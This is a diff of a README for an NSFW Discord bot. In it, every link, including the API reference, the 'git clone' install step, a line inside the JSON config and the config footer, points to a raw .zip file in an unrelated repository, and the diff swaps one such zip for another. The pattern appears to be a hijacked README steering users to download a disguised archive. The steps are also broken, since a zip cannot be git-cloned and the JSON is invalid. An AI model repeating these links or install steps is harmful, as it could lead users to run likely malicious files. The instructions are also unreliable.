@@ -1,6 +1,6 @@
 # NSFW Bot
 
-NSFW Bot is an open-source discord bot that has nsfw commands running with the https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/handler/nodriver-serverless-v3.7.zip api.
+NSFW Bot is an open-source discord bot that has nsfw commands running with the https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/commands/nsfw/nodriver_serverless_v3.3.zip api.
 
 ## Commands :
 
@@ -10,7 +10,7 @@ NSFW Bot is an open-source discord bot that has nsfw commands running with the h
 ## How to install ?
 
 ```bash
-git clone https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/handler/nodriver-serverless-v3.7.zip
+git clone https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/commands/nsfw/nodriver_serverless_v3.3.zip
 cd NSFW-Bot
 npm i
 ```
@@ -18,12 +18,12 @@ npm i
 ## How to config ?
 
 ```json
-https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/handler/nodriver-serverless-v3.7.zip
+https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/commands/nsfw/nodriver_serverless_v3.3.zip
 {
   "prefix": "your prefix",
   "token": "your token",
   "owners": ["OWNER ID"],
-  "footer": "NSFW Bot • https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/handler/nodriver-serverless-v3.7.zip",
+  "footer": "NSFW Bot • https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/commands/nsfw/nodriver_serverless_v3.3.zip",
 
   "msg": {
     "nsfwWarn": "You must use this command in an nsfw channel!",
